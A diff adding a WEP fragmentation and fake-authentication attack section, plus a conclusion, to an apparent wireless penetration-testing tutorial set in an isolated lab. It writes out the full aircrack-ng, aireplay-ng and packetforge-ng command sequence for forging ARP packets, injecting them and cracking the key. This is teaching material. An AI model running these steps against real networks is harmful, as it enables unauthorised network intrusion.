@@ -331,7 +331,105 @@ If successful, the WEP key will be displayed, allowing access to the network.
 
 At the end of the process, remember to disable monitor mode and switch your adapter back to managed mode
 
-## Monitoring
+### 6.3 Case 3: Fragmentation Attack Authentication (WEP Active Advanced Attack)
+
+In the first two cases, we focused on capturing packets either passively or actively by accelerating traffic through ARP replay attacks. Both techniques depend on the presence of at least one client connected to the WEP network to generate sufficient encrypted traffic. But what if the network is quiet, or no clients are connected? In such scenarios, traditional ARP replay attacks fail because there is no traffic to capture or stimulate.
+
+This third case explores an advanced attack combining **fragmentation** and **fake authentication** techniques. Fragmentation attacks exploit how WEP handles small packet fragments, allowing us to recover a portion of the keystream without needing the full data packet. Once the keystream is recovered, it is possible to forge a valid encrypted packet — typically an ARP request — which can then be injected into the network. This injection triggers the Access Point to respond and generate new encrypted packets with fresh Initialization Vectors (IVs). 
+
+The beauty of this method is that it works even on idle networks without any active clients, filling the gap left by the previous techniques. It highlights a critical weakness in WEP’s design and makes cracking such networks feasible.
+
+To start, you first need to put your wireless adapter into monitor mode, enabling packet capture and injection on the wireless channel:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo airmon-ng start wlan0
+```
+
+Next, scan for WEP-enabled Access Points in range:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo airodump-ng wlan0
+```
+
+Identify your target by its BSSID and operating channel. Once identified, begin capturing packets specifically from this AP:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo airodump-ng --bssid <BSSID> -c <channel> -w wep_frag wlan0
+```
+
+Since you have no legitimate client to associate with, perform a fake authentication to trick the AP into accepting your injections:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aireplay-ng -1 0 -a <BSSID> -h <fake-MAC> wlan0
+```
+
+This creates a fake association that allows packet injection.
+Now, launch the fragmentation attack to recover a partial keystream by exploiting small packet fragments sent by the AP:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aireplay-ng -5 -b <BSSID> -h <fake-MAC> wlan0
+```
+
+Once a keystream is extracted, forge an encrypted ARP request packet using the recovered keystream. This forged packet will be used to inject traffic and stimulate the network:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo packetforge-ng -0 -a <BSSID> -h <fake-MAC> -k <source-IP> -l <destination-IP> -y <keystream-file> -w arp-request
+
+Using packet type: ARP Request
+Reading IVs from keystream file: keystream.txt
+
+Forge a packet with the following parameters:
+
+  Source MAC address : 66:77:88:99:AA:BB
+  Destination MAC    : Broadcast (FF:FF:FF:FF:FF:FF)
+  BSSID             : 00:11:22:33:44:55
+  Packet type       : ARP Request
+
+Writing forged packet to arp-request
+
+Forge completed successfully.
+```
+
+- `-0` Forge ARP request packet (packet type 0)
+- `-a` BSSID of the target Access Point
+- `-h` Fake MAC address to use as source
+- `-k` Source IP address
+- `-l` Destination IP address
+- `-y` Keystream file generated from fragmentation attack
+- `-w` Output file name to save the forged packet
+
+Inject the forged packet into the network:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aireplay-ng -2 -r arp-request wlan0
+```
+
+This injection causes the AP to generate new encrypted packets, increasing the number of IVs available for capture.
+With traffic now stimulated, continue to collect IVs with an ARP replay attack:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aireplay-ng --arpreplay -b <BSSID> -h <fake-MAC> wlan0
+```
+
+Monitor the number of IVs captured until you have enough (usually 10,000+).
+Finally, crack the WEP key using aircrack-ng:
+
+```bash
+┌──(proxygeek㉿VMware-kali)-[~]
+└─$ sudo aircrack-ng wep_frag.cap
+```
+
+If successful, you will obtain the WEP key and gain access to the network.
+
+## Automation WEP
 
 As we continue to explore wireless security in a controlled and isolated environment, we can utilize tools like Wifite2 to audit and capture network data. For example, the following command:
 
@@ -371,6 +469,14 @@ Here is a sample of the output you might see when running wifite:
 In this list, each entry represents a wireless access point (AP) detected within range, with information about its ESSID (network name), channel, encryption type, signal strength (PWR), WPS status, and connected clients.
 
 This tool is essential for understanding and evaluating the security of wireless networks within a controlled and isolated environment, providing insight into nearby networks and preparing for more complex penetration testing in future parts of this series.
+
+## 6 Conclusion
+
+In this third part, we focused on the practical weaknesses of the WEP encryption protocol. We explored passive and active attack techniques, including packet capturing, ARP replay injection, and fragmentation attacks combined with fake authentication. These real-world examples highlighted why WEP is no longer considered secure and should be avoided whenever possible.
+
+Additionally, we introduced automation tools like **Wifite** to streamline the process of auditing WEP networks, making attacks more accessible while reinforcing the importance of understanding the underlying concepts.
+
+With a solid grasp of WEP vulnerabilities and attack methods, we are now ready to move forward and tackle more modern wireless security protocols. In the next part, we will dive into WPA and WPA2, uncovering their strengths and weaknesses, and learning how to capture handshakes and perform dictionary attacks.
 
 
 ---
